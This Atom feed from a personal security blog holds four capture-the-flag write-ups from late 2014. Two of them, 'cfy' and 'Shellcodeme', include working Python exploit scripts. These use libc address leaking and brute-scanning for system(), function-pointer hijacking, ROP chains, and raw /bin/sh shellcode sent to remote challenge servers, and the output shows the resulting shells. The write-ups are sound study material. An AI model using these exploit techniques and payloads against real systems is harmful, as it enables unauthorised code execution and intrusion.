<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Binary | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/binary/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-12-30T11:05:59+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[31C3 CTF - Cfy]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/"/>
    <updated>2014-12-29T12:06:07+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy</id>
    <content type="html"><![CDATA[<p>Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at <code>cfy</code>.</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given the binary and a place to connect to. Upon connecting with <code>nc</code>, we see the following:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3$ nc 188.40.18.73 3313
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
</code></pre>

<p>With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak <code>libc</code> address from the got:</p>

<pre><code class="python">#!/usr/bin/python

import struct 
import time
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))


def p(x):
    return struct.pack("L", x)

addr = 0x601020

payload = ""
payload += "2\n"
payload += p(addr)  # printf
payload += "\n"

print s.recv(1000)
s.send(payload)
time.sleep(0.5)
print s.recv(1000)
</code></pre>

<p>Given us the ouput:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ python read.py 
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit


Please enter your number: dec: 140512731112416
hex: 0x7fcbab6ca3e0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
</code></pre>

<p>Unfortunately, running the python script again shows a different output value. This means that ASLR is enabled. Furthermore, I didn&rsquo;t know what version of <code>libc</code> was running!</p>

<p>I turned my attention to gaining code execution. This was more trivial, although it wasn&rsquo;t a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:</p>

<pre><code>  4008af: 48 c1 e0 04           shl    rax,0x4         ; multiply value by 16
  4008b3: 48 05 80 10 60 00     add    rax,0x601080    ; address of parsers, see below
  4008b9: 48 8b 00              mov    rax,QWORD PTR [rax]
  4008bc: bf e0 10 60 00        mov    edi,0x6010e0    ; address of buf, see below
  4008c1: ff d0                 call   rax             ; gain code exec here!
</code></pre>

<p>There is no check performed on the value in <code>rax</code>. If we pass in a normal value, like <code>2</code>, the binary fetches the corresponding parser here:</p>

<pre><code>gdb-peda$ p parsers
$1 = { {
    fn = 0x40073d &lt;from_hex&gt;, 
    desc = 0x4009b4 "parse from hex"
  }, {
    fn = 0x400761 &lt;from_dec&gt;, 
    desc = 0x4009c3 "parse from dec"
  }, {
    fn = 0x400785 &lt;from_ptr&gt;, 
    desc = 0x4009d2 "parse from pointer"
  } }
</code></pre>

<p>But look here: <code>buf</code> is almost right behind <code>parsers</code>:</p>

<pre><code class="">gdb-peda$ x/40wx parsers
0x601080 &lt;parsers&gt;:             0x0040073d  0x00000000  0x004009b4  0x00000000
0x601090 &lt;parsers+16&gt;:          0x00400761  0x00000000  0x004009c3  0x00000000
0x6010a0 &lt;parsers+32&gt;:          0x00400785  0x00000000  0x004009d2  0x00000000
0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000
0x6010c0 &lt;stdout@@GLIBC_2.2.5&gt;: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff
0x6010d0 &lt;completed.6972&gt;:      0x00000000  0x00000000  0x00000000  0x00000000
0x6010e0 &lt;buf&gt;:                 0x00000000  0x00000000  0x00000000  0x00000000
0x6010f0 &lt;buf+16&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
0x601100 &lt;buf+32&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
0x601110 &lt;buf+48&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>If we somehow load <code>buf</code> with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the <code>buf</code> section and we have control over execution:</p>

<pre><code class="bash">gdb-peda$ r
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
7   # give bigger number!

Please enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x6161616161616161 ('aaaaaaaa')
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
RSI: 0x7ffff7ff7035 --&gt; 0x0 
RDI: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
RBP: 0x7fffffffe4b0 --&gt; 0x0 
RSP: 0x7fffffffe4a0 --&gt; 0x7ffffe590 
...snip...
[-------------------------------------code-------------------------------------]
   0x4008b3 &lt;main+167&gt;: add    rax,0x601080
   0x4008b9 &lt;main+173&gt;: mov    rax,QWORD PTR [rax]
   0x4008bc &lt;main+176&gt;: mov    edi,0x6010e0
=&gt; 0x4008c1 &lt;main+181&gt;: call   rax
   0x4008c3 &lt;main+183&gt;: mov    QWORD PTR [rbp-0x8],rax
   0x4008c7 &lt;main+187&gt;: mov    rax,QWORD PTR [rbp-0x8]
   0x4008cb &lt;main+191&gt;: mov    rsi,rax
   0x4008ce &lt;main+194&gt;: mov    edi,0x400a3d
Guessed arguments:
arg[0]: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
..snip...
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004008c1 in main ()
</code></pre>

<p>Excellent. Now what pointer should we store in <code>buf</code>? I couldn&rsquo;t make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to <code>system()</code> with <code>/bin/sh</code> as argument. But where was <code>system()</code> located?</p>

<p>I had no idea what <code>libc</code> version was running. I did have an arbitrary read primitive though. I had downloaded <code>libc-2.19</code> and from the addresses of <code>printf</code> and <code>puts</code> (both available in the GOT) I deduced that this <em>wasn&rsquo;t</em> the correct version. However, I decided to scan the remote binary&rsquo;s libc for signature bytes of <code>system()</code>. I assumed it started with these bytes:</p>

<pre><code>bas@tritonal:~/tmp/31c3/cfy$ gdb ./libc-2.19.so 
GNU gdb (GDB) 7.4.1-debian
...snip...
gdb-peda$ x/8b system
0x46530 &lt;system&gt;:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
</code></pre>

<p>So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for <code>ff85</code> in the output.</p>

<pre><code class="python">#!/usr/bin/python

import struct, time, re

def p(x):
    return struct.pack("L", x)

payload = ""
payload += "2\n"
payload += p(0x601020)  # printf
payload += "\n"

import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(1.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

OFFSET=63580    # guesstimated from real libc
for i in range(5000):
    payload = ""
    payload += "2\n"
    payload += p(int(PRINTF, 16)-OFFSET-i)
    payload += "\n"

    s.send(payload)

    data = s.recv(200)
    print data
    print i

    if 'ff85' in data: # part of test rdi, rdi
            print "[!] found possible offset for system(): printf-%d" % (int(PRINTF,16)-(int(PRINTF, 16)-OFFSET-i))
            print "[!] system @ %s" % hex(int(PRINTF, 16)-OFFSET-i)
            raw_input()
</code></pre>

<p>It gave a lot of possible addresses, and once I thought I had <code>system()</code> but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:</p>

<pre><code>...snip...
85
[!] found possible offset for system(): printf-63665
[!] system @ 0x7f4df0086b2f


Please enter your number: dec: 2803784840145881088
hex: 0x26e90b74ff854800

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

86
[!] found possible offset for system(): printf-63666
[!] system @ 0x7f4df0086b2e
</code></pre>

<p>At <code>printf-63665</code>, libc indeed has the first few bytes of <code>system()</code>. It started with a <code>00</code> byte, so I decreased the value by one and plugged that value into a script.</p>

<pre><code class="python">#!/usr/bin/python

import struct, time, re, telnetlib, socket

def p(x):
    return struct.pack("L", x)

# leak printf address in libc via GOT pointer
payload = ""
payload += "2\n"
payload += p(0x601020)  # printf@plt
payload += "\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(0.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

print "[+] found printf: %x" % int(PRINTF, 16)
SYSTEM = int(PRINTF, 16) - 63664
print "[+] system at %x" % int(SYSTEM)

# spam system into buf
payload = ""
payload += "1\n"        
payload += p(SYSTEM)    # address of system() will be stored in buf
payload += p(SYSTEM)    # buf+8
payload += p(SYSTEM)    # buf+16
payload += "\n"

s.send(payload)
print s.recv(200)

payload = ""
payload += "7\n"        # use an address further into buf (parsers+7*16)
payload += "/bin/sh\n"  # because this will overwrite the first few bytes

s.send(payload)         # send payload, causing it to call system('/bin/sh')

t = telnetlib.Telnet()  # interact with spawned shell
t.sock = s
t.interact()
</code></pre>

<p>I ran the script and crossed my fingers:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ python exploit.py 
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit


Please enter your number: dec: 140686779126752
hex: 0x7ff4317e93e0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

[+] found printf: 7ff4317e93e0
[+] system at 7ff4317d9b30

Please enter your number: 
dec: 0
hex: 0x0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit

Please enter your number: id
uid=1001(cfy) gid=1001(cfy) groups=1001(cfy)
cat /home/cfy/flag
THANK YOU WARIO!

BUT OUR PRINCESS IS IN
ANOTHER CASTLE!

Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
</code></pre>

<p>So the flag was <code>31C3_G0nna_keep&lt;on&gt;grynding</code>. I thought this was quite tough based on the amount of points&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackvent 2014 - Reversing Day 23]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23/"/>
    <updated>2014-12-27T14:45:39+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/27/hackvent-2014-reversing-day-23</id>
    <content type="html"><![CDATA[<p>Someone passed me a binary and said &lsquo;Here, you&rsquo;ll enjoy this one&rsquo;. I most certainly did&hellip;</p>

<!-- more -->


<p>The guy also gave one hint, which I needed later. I started checking out the binary, which turned out to be a 32-bit Windows PE executable. I downloaded <a href="http://modern.ie">an XP VM</a> and an old, familiar friend: <a href="http://www.ollydbg.de">OllyDbg 1.10</a>, arguably the best debugger for Windows.</p>

<p>Starting up the binary, I was presented with a simple dialog:</p>

<p><img src="/assets/hv14/hv14-00.png" alt="" /></p>

<p>I tried entering a string to check, but it didn&rsquo;t do anything. I set a few breakpoints, but when I switched back to the dialog, the binary crashed!</p>

<p><img src="/assets/hv14/hv14-01.png" alt="" /></p>

<p>What was going on here? <code>IsDebuggerPresent</code> was not referenced in the code, but maybe something else was going on. I set a memory breakpoint on a piece of code where I previously had set a breakpoint and pressed F9.</p>

<p><img src="/assets/hv14/hv14-02.png" alt="" /></p>

<p>Then, the binary stopped here:</p>

<p><img src="/assets/hv14/hv14-03.png" alt="" /></p>

<p>Quite interesting! The binary checks itself for <code>0xCC</code> bytes, aka <code>INT 3</code>. There were two of those checks, one at <code>0x4025e0</code> and one at <code>0x402536</code>. I modified the following <code>JNZ</code> to a <code>JMP</code> so the code would never do anything when it found a breakpoint. Now I could set breakpoints where ever I liked!</p>

<p>Back to the <code>SendDlgItemMessageA</code> calls.</p>

<p><img src="/assets/hv14/hv14-04.png" alt="" /></p>

<p>The binary checks the length of our input and if it is exactly <code>0x1D</code> or 29 bytes, it continues by fetching the input. It checks the input for <code>-</code> characters at specific places. From this I deduced that the format of the input should be <code>ABCD-DEFG-HIJK-LMNO-PQRS-TUVW</code>. I entered that and pressed check, ending up here:</p>

<p><img src="/assets/hv14/hv14-06.png" alt="" /></p>

<p>The code now sends a message to its message queue, but I didn&rsquo;t know the location of the handler. No worries; I stepped into the call with F7 until I was in NTDLL.dll, and then set a memory breakpoint on the code area at <code>0x401000</code>. A break-on-access also works.</p>

<p><img src="/assets/hv14/hv14-07.png" alt="" /></p>

<p>After pressing F9, this landed me at the handler!</p>

<p><img src="/assets/hv14/hv14-08.png" alt="" /></p>

<p>I traced through this function with F7, finally ending up here:</p>

<p><img src="/assets/hv14/hv14-09.png" alt="" /></p>

<p>The code takes the first four bytes of our input, XORs them with a certain value and then proceeds to call the code at the resulting value&hellip; Only problem is, there was no code at <code>0x703234BD</code>! I remembered the hint I got at the beginning: &ldquo;the flag probably starts with <code>HV14</code>&rdquo;. I changed the input to <code>HV14-ABCD-DEFG-HIJK-LMNO-PQRS</code> and restarted it again, to end up at the same CALL EAX:</p>

<p><img src="/assets/hv14/hv14-10.png" alt="" /></p>

<p>With a single F7, I ended up here:</p>

<p><img src="/assets/hv14/hv14-11.png" alt="" /></p>

<p>Here, some tricky stuff starts happening! A call to <code>VirtualProtect</code> makes the code in front of us writeable, and the binary starts modifying that code:</p>

<p><img src="/assets/hv14/hv14-12.png" alt="" /></p>

<p>Cool <em>and</em> a nice anti-disassembler tactic, this self-modifying code. It can be tricky to reverse, in this case especially the call that emerges:</p>

<p><img src="/assets/hv14/hv14-13.png" alt="" /></p>

<p>Carefully using F7, I traced passed this anti-disassembler trick and found myself at this CALL ECX:</p>

<p><img src="/assets/hv14/hv14-14.png" alt="" /></p>

<p>I stepped into it, landing at this position. Now it becomes really interesting, the binary apparently calls a function that does <em>something</em> with our input, then sends another message to the message queue. I decided to place a breakpoint at <code>0x4022B3</code> and pressed F9; I would examine the function later. First see what happens:</p>

<p><img src="/assets/hv14/hv14-15.png" alt="" /></p>

<p>Indeed, we land at the message handler. After decrypting a string, the binary does a byte-by-byte comparison of our mangled input and some other buffer:</p>

<p><img src="/assets/hv14/hv14-17.png" alt="" /></p>

<p>The code that comes after it congratulates us, but only if the buffer equals our mangled input. I decided to find out where our input was being mangled. I restarted the binary and set a memory breakpoint on the first four bytes of the input:</p>

<p><img src="/assets/hv14/hv14-18.png" alt="" /></p>

<p>Pressing F9, the code breaks at the CALL EAX, of course. Another F9 lands us here:</p>

<p><img src="/assets/hv14/hv14-19.png" alt="" /></p>

<p>Ah! The first byte of our input, &lsquo;H&rsquo;, is being XOR&#8217;ed with another value. This is repeated for all the bytes in the input:</p>

<p><img src="/assets/hv14/hv14-20.png" alt="" /></p>

<p>I wrote down (literally!) all the values that were used in <code>AL</code> and finally, I ended up at the REPE CMPS instruction:</p>

<p><img src="/assets/hv14/hv14-21.png" alt="" /></p>

<p>I took note of the values at <code>EDI</code> and together with the values from the XOR statement earlier, I had all the thing necessary to grab the flag! Sprinkle in some Python magic:</p>

<p><img src="/assets/hv14/hv14-22.png" alt="" /></p>

<p>And we have the flag!</p>

<p><img src="/assets/hv14/hv14-23.png" alt="" /></p>

<p>It has been a while since I got to use OllyDbg to reverse a Windows binary. Between the self-modifying code, the use of the flag and <code>SendMessage</code> to control code execution, this was a very enjoyable challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Bruteforce]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce/"/>
    <updated>2014-12-24T11:38:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-bruteforce</id>
    <content type="html"><![CDATA[<p>Bruteforce they said, it&rsquo;ll be fun, they said&hellip;</p>

<!-- more -->


<p>We&rsquo;re given only a binary and are told that we shouldn&rsquo;t bruteforce the server. The binary, when started, only says &ldquo;calculating&hellip;..&rdquo; and not much else. Upon closer examination, I found that it does some calculations and checks a certain number before printing out the flag:</p>

<pre><code>   0x400703:    movsxd rax,DWORD PTR [rsp+0x8]
=&gt; 0x400708:    cmp    rax,QWORD PTR [rip+0x200969]        # 0x601078
   0x40070f:    je     0x400780
   0x400711:    add    DWORD PTR [rsp+0xc],0x1
</code></pre>

<p>If <code>eax</code> matches the value at <code>0x601078</code>, then the code jumps here:</p>

<pre><code>  400780:   8b 54 24 0c             mov    edx,DWORD PTR [rsp+0xc]
  400784:   be b1 09 40 00          mov    esi,0x4009b1 ; bruteforce : 0x4009b1 ("the flag is: ADCTF_%d\n")
  400789:   bf 01 00 00 00          mov    edi,0x1
  40078e:   31 c0                   xor    eax,eax
  400790:   e8 7b fe ff ff          call   400610 &lt;__printf_chk@plt&gt;
</code></pre>

<p>So the calculates until a certain value is found and then dumps the flag. I found a couple of rate-limiting things, such as these syscalls:</p>

<pre><code>  4008e0:   49 89 ce                mov    r14,rcx
  4008e3:   48 89 fa                mov    rdx,rdi
  4008e6:   4c 89 d7                mov    rdi,r10
  4008e9:   4c 89 ce                mov    rsi,r9
  4008ec:   48 31 c0                xor    rax,rax
  4008ef:   b0 23                   mov    al,0x23  ; nanosleep
  4008f1:   0f 05                   syscall 
</code></pre>

<p>I didn&rsquo;t want to slow it down so I nop&#8217;ed out three of those syscalls, along with the calls to putchar and printf. I ran the binary, occasionaly checking at which it was&hellip; but it still was very slow! Time for a different approach&hellip;</p>

<p>Running the binary and breaking at the comparison at <code>0x400708</code>, I compared the value at <code>rsp+0x8</code> and <code>rsp+0xc</code> (which is used to print out the flag eventually). I noticed these numbers:</p>

<pre><code>rsp+0x8     rsp+0xc
-------------------
    1           1
    2           2
    3           5
    4           7
    5           11
</code></pre>

<p>It didn&rsquo;t take me long to realize we&rsquo;re looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at <code>0x400708</code> is true. <code>eax</code> contains the ordinal number of the last prime found and is compared to <code>0x989680</code>. That would be 10,000,000 in decimal. I quickly located a list of <a href="https://primes.utm.edu/lists/small/millions/">prime numbers</a> and found the 10th million: 179,424,673.</p>

<p>Therefore, the flag was: <code>ADCTF_179424673</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Shellcodeme]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/"/>
    <updated>2014-12-24T11:37:46+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme</id>
    <content type="html"><![CDATA[<p>Why o why do we take part in these painful exercises? Again, <code>shellcodeme</code> seemed like such a simple task. But looks, like all the other challenges of Advent CTF 2014, can be deceiving!</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given a binary and the C source code:</p>

<pre><code class="c">/* gcc -m32 -fno-stack-protector -znoexecstack -o shellcodeme shellcodeme.c */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;

#define SHELLCODE_LEN 1024

int main(void) {
    char *buf;
    buf = mmap((void *)0x20000000, SHELLCODE_LEN, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    read(0, &amp;buf, SHELLCODE_LEN);
    mprotect((void *)0x20000000, SHELLCODE_LEN, PROT_READ); // no no no~
    (*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
}
</code></pre>

<p>The bug was kind of obvious:</p>

<pre><code class="c">read(0, &amp;buf, SHELLCODE_LEN); // read to the location of buf itself
</code></pre>

<p>The code will read in the shellcode at <code>&amp;buf</code>, not <code>buf</code>. This will allow us to overwrite that pointer and take control of execution at this line of code:</p>

<pre><code class="c">(*(void(*)()) buf)(); // SEGV! no exec. can you execute shellcode?
</code></pre>

<p>I chose to overwrite the <code>buf</code> pointer with <code>0x080484fc</code>, which is <code>leave; ret</code>. This will restore the stack and land us in my ROP chain. The basic idea is to re-use <code>mprotect</code> and <code>read</code> to read in the shellcode and then return to it. The following python code did just that, landing me a shell on the box:</p>

<pre><code class="python">#!/usr/bin/python
import struct
import socket
import telnetlib
import time

def p(x):
        return struct.pack('&lt;L', x)

POP3RET = 0x804855d
MPROTECT = 0x8048330
READ = 0x8048340

payload = ""
payload += p(0x080484fc)        # leave; ret (restore stack)
payload += "A"*12               # dummy 

payload += p(MPROTECT)          # mprotect shellcode area back to rwx
payload += p(POP3RET)           # fix stack
payload += p(0x20000000)        # addr of shellcode
payload += p(0x1000)            # size (page-aligned)
payload += p(0x7)               # PROT_READ|PROT_EXEC|PROT_WRITE

payload += p(READ)              # read in our shellcode
payload += p(POP3RET)           # fix stack
payload += p(0x0)               # stdin
payload += p(0x20000000)        # address
payload += p(1024)              # copied value

payload += p(0x20000000)        # return to shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.katsudon.org', 33201))

# send first stage
s.send(payload)

# for some reason, this delay was necessary
time.sleep(0.05)

# send shellcode, spawns /bin/sh
s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>

<pre><code class="bash">root@kali:~# python exploit.py
id
uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
ls -alh
total 36K
dr-xr-xr-x 2 root shellcodeme2 4.0K Dec 22 22:09 .
drwxr-xr-x 3 root root         4.0K Dec 22 22:09 ..
-rw-r--r-- 1 root shellcodeme2  220 Sep 26 04:49 .bash_logout
-rw-r--r-- 1 root shellcodeme2 3.4K Sep 26 04:49 .bashrc
-rw-r--r-- 1 root shellcodeme2  675 Sep 26 04:49 .profile
-r--r----- 1 root shellcodeme2   34 Dec 22 22:09 flag
-r-xr-sr-x 1 root shellcodeme2 8.5K Dec 22 22:09 shellcodeme2
cat flag 2&gt;&amp;1
cat: flag: Permission denied
</code></pre>

<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>

<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>

<pre><code class="bash">   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
</code></pre>

<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>

<pre><code>0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
</code></pre>

<p>Prepare for some mind-bending ROP chains&hellip;</p>

<pre><code class="python">#!/usr/bin/python

import struct
def p(x):
    return struct.pack("L", x)

payload = ""

'''
   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
'''

# first, fix up stack   
payload += p(0x00400690)    # pop pop ret
payload += p(0x0)
payload += p(0x0)

#### MPROTECT
# gadgets to set edi, esi and edx and call mprotect
payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p(0x6)           # rbx   &lt;&lt; needs to be ebp-1 for code path!
payload += p(0x7)           # rbp -&gt; edx = mprotect.mask
payload += p(0x00601038-6*8)    # r12 -&gt; mprotect@got.plt
payload += p(0x0)           # r13
payload += p(0x400)         # r14 -&gt; rsi -&gt; esi = mprotect.len
payload += p(0x20000000)    # r15 -&gt; rdi -&gt; edi = mprotect.addr

payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
payload += "B"*(200-144)    # spacer

#### READ
# gadgets to set edi, esi and edx and call read
'''
   0x00000000004005f2 &lt;+53&gt;:    mov    edx,0x400
   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;read@plt&gt;
'''
# 0x601020 &lt;read@got.plt&gt;
payload += p(0x0040068a)    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
payload += p(0x400-1)       # rbx   &lt;&lt; needs to be ebp-1 for code path!
payload += p(0x400)         # rbp -&gt; edx = 0x400
payload += p(0x601020-0x3ff*8)  # r12 -&gt; read@got.plt
payload += p(0x0)           # r13 
payload += p(0x20000000)    # r14 -&gt; rsi -&gt; esi = read.addr
payload += p(0x0)           # r15 -&gt; rdi -&gt; edi = 0?
                            # lucky for me, rax = 0
payload += p(0x00400671)    #mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
payload += "B"*(200-144)    # spacer

# return to shellcode!
payload += p(0x20000000)

print payload
</code></pre>

<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>

<pre><code>   0x400671 &lt;__libc_csu_init+65&gt;:   mov    edx,ebp
   0x400673 &lt;__libc_csu_init+67&gt;:   mov    rsi,r14
   0x400676 &lt;__libc_csu_init+70&gt;:   mov    edi,r15d
   0x400679 &lt;__libc_csu_init+73&gt;:   call   QWORD PTR [r12+rbx*8]
   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp  
   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
   0x400686 &lt;__libc_csu_init+86&gt;:   add    rsp,0x8
   0x40068a &lt;__libc_csu_init+90&gt;:   pop    rbx
   0x40068b &lt;__libc_csu_init+91&gt;:   pop    rbp
   0x40068c &lt;__libc_csu_init+92&gt;:   pop    r12
   0x40068e &lt;__libc_csu_init+94&gt;:   pop    r13
   0x400690 &lt;__libc_csu_init+96&gt;:   pop    r14
   0x400692 &lt;__libc_csu_init+98&gt;:   pop    r15
   0x400694 &lt;__libc_csu_init+100&gt;:  ret    
</code></pre>

<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>

<p>The problem arises after returning from the mprotect call:</p>

<pre><code class="bash">   0x40067d &lt;__libc_csu_init+77&gt;:   add    rbx,0x1
   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
</code></pre>

<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>

<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>

<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>

<pre><code class="python">shellcode = payload.encode('hex')

output = ""

for i in range(len(shellcode)/2):
    output += "\\x" +shellcode[i*2:i*2+2]

print output
</code></pre>

<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>

<pre><code>xor byte [rdi + 11], 0x41
--&gt;
xor byte [rdi + 4], 0x41
</code></pre>

<p>And <strong>finally</strong>, starting from the first binary:</p>

<pre><code class="bash">root@kali:~# python exploit.py
id
uid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)
